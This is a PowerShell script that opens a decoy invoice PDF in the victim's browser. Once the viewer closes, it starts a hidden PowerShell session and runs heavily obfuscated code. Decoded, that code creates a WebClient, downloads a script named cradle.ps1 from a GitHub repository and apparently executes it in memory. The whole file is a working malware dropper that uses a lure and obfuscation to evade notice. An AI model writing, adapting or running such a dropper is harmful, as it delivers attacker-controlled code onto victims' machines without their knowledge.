$pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
$pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"

$browserPaths = @(
    "C:\Program Files\Google\Chrome\Application\chrome.exe",
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files\Opera\opera.exe",
    "C:\Program Files\Opera GX\opera.exe",
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "C:\Program Files\Mozilla Firefox\firefox.exe"
)

$browserProcessNames = @(
    "chrome",
    "brave",
    "opera",
    "msedge",
    "firefox"
)

Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -ErrorAction SilentlyContinue

$browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($browser) {
    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -ErrorAction SilentlyContinue
} else {
    Start-Process $pdfPath -ErrorAction SilentlyContinue
}

function Get-PDFRenderer {
    $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    $procs | Where-Object {
        $name = $_.Name -replace "\.exe$", ""
        ($browserProcessNames -contains $name) -and
        ($_.CommandLine -match "\.pdf")
    } | Select-Object ProcessId, Name, CommandLine
}

do {
    $pdfProcesses = Get-PDFRenderer
    if ($pdfProcesses) {
        Start-Sleep -Seconds 20
    }
} while ($pdfProcesses)

powershell -NoP -sta -NonI -W Hidden -enc
$t9bR6wBF0T2 = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_}) $([char](16+83-16)+[char](68+121-68)+[char](105*115/105)+[char](0+116-0)+[char](35+101-35)+[char](107*109/107)+[char](10+46-10)+[char](0+78-0)+[char](117*101/117)+[char](56+116-56)+[char](105+46-105)+[char](107*87/107)+[char](87*101/87)+[char](17+98-17)+[char](0+67-0)+[char](43*108/43)+[char](97+105-97)+[char](0+101-0)+[char](0+110-0)+[char](110+116-110)); $KtOjvuzeGpDZo1dYMh9y = ([string]::join('', ( (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,66,114,111,116,104,101,114,115,101,120,116,114,101,109,101,103,97,109,105,110,103,47,112,119,115,104,99,114,97,100,108,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,99,114,97,100,108,101,46,112,115,49) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_}); $t9bR6wBF0T2.DownloadString($KtOjvuzeGpDZo1dYMh9y) |<##>ForEach-Object{$_}<##>| & (("-83zmRSlMQucnVxLUIXsPFo29gqKk05B1dETahHJAtG6OeyYWfiwbDZ7v4jrNpC")[17,12,56,22,28,45,0,34,14,61,59,45,19,19,50,22,12] -join '')

